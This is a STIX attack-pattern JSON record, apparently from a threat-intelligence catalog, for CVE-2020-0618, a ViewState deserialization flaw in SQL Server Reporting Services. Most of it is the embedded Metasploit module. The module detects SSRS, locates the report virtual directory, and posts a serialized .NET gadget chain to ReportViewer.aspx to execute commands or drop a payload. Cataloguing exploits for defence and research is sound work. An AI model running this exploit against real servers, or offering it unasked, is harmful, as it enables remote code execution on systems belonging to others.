{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6b089d7f-62bf-4349-a86f-38bde6425cc6",
    "created": "2024-08-14T16:52:22.433352Z",
    "modified": "2024-08-14T16:52:22.433356Z",
    "name": "SQL Server Reporting Services (SSRS) ViewState Deserialization",
    "description": " A vulnerability exists within Microsoft's SQL Server Reporting Services which can allow an attacker to craft an HTTP POST request with a serialized object to achieve remote code execution. The vulnerability is due to the fact that the serialized blob is not signed by the server. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/ssrs_navcorrector_viewstate.rb",
            "external_id": "ssrs_navcorrector_viewstate.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-0618"
        },
        {
            "source_name": "reference",
            "url": "https://www.mdsec.co.uk/2020/02/cve-2020-0618-rce-in-sql-server-reporting-services-ssrs/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'SQL Server Reporting Services (SSRS) ViewState Deserialization',\n        'Description' => %q{\n          A vulnerability exists within Microsoft's SQL Server Reporting Services\n          which can allow an attacker to craft an HTTP POST request with a\n          serialized object to achieve remote code execution. The vulnerability is\n          due to the fact that the serialized blob is not signed by the server.\n        },\n        'Author' => [\n          'Soroush Dalili',   # discovery and original PoC\n          'Spencer McIntyre'  # metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2020-0618'],\n          ['URL', 'https://www.mdsec.co.uk/2020/02/cve-2020-0618-rce-in-sql-server-reporting-services-ssrs/'],\n        ],\n        'Platform' => 'win',\n        'Targets' => [\n          [ 'Windows (x86)', { 'Arch' => ARCH_X86, 'Type' => :windows_dropper } ],\n          [ 'Windows (x64)', { 'Arch' => ARCH_X64, 'Type' => :windows_dropper } ],\n          [ 'Windows (cmd)', { 'Arch' => ARCH_CMD, 'Type' => :windows_command, 'Space' => 3000 } ]\n        ],\n        'DefaultTarget' => 1,\n        'DisclosureDate' => '2020-02-11',\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE, ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS, ],\n          'Reliability' => [ REPEATABLE_SESSION, ]\n        },\n        'Privileged' => true\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [ true, 'The base path to the web application', '/Reports' ]),\n      OptString.new('DOMAIN', [ true, 'The domain to use for Windows authentication', 'WORKSTATION' ]),\n      OptString.new('USERNAME', [ true, 'Username to authenticate as', '' ]),\n      OptString.new('PASSWORD', [ true, 'The password to authenticate with' ])\n    ])\n    register_advanced_options([\n      OptFloat.new('CMDSTAGER::DELAY', [ true, 'Delay between command executions', 0.5 ]),\n    ])\n  end\n\n  def send_api_request(*parts)\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'api', 'v1.0', *parts),\n      'headers' => {\n        'Accept' => 'application/json'\n      },\n      'username' => datastore['USERNAME'],\n      'password' => datastore['PASSWORD']\n    })\n    if res&.code == 200 && res.headers['Content-Type'].strip.start_with?('application/json;')\n      return res.get_json_document\n    end\n  end\n\n  def check\n    json_response = send_api_request('ReportServerInfo', 'Model.SiteName')\n    return CheckCode::Unknown unless json_response && json_response['value'] == 'SQL Server Reporting Services'\n\n    CheckCode::Detected\n  end\n\n  def exploit\n    fail_with(Failure::NotFound, 'Failed to detect the application') unless check == CheckCode::Detected\n\n    json_response = send_api_request('ReportServerInfo', 'Model.GetVirtualDirectory')\n    fail_with(Failure::UnexpectedReply, 'Failed to detect the report server virtual directory') if json_response.nil?\n    directory = json_response['value']\n    vprint_status(\"Detected the report server virtual directory as: #{directory}\")\n\n    state = { vd: directory }\n    if target['Type'] == :windows_command\n      execute_command(payload.encoded, state: state)\n    else\n      cmd_target = targets.select { |target| target['Type'] == :windows_command }.first\n      execute_cmdstager({ linemax: cmd_target.opts['Space'], delay: datastore['CMDSTAGER::DELAY'], state: state })\n    end\n  end\n\n  def execute_command(cmd, opts)\n    state = opts[:state]\n    viewstate = Rex::Text.encode_base64(::Msf::Util::DotNetDeserialization.generate(\n      cmd,\n      gadget_chain: :TextFormattingRunProperties,\n      formatter: :LosFormatter\n    ))\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(state[:vd], 'Pages', 'ReportViewer.aspx'),\n      'method' => 'POST',\n      'vars_post' => {\n        'NavigationCorrector$PageState' => 'NeedsCorrection',\n        'NavigationCorrector$ViewState' => viewstate,\n        '__VIEWSTATE' => ''\n      },\n      'username' => datastore['USERNAME'],\n      'password' => datastore['PASSWORD']\n    })\n\n    unless res&.code == 200\n      print_error('Non-200 HTTP response received while trying to execute the command')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-02-11",
    "x_mitre_platforms": [
        "win'"
    ]
}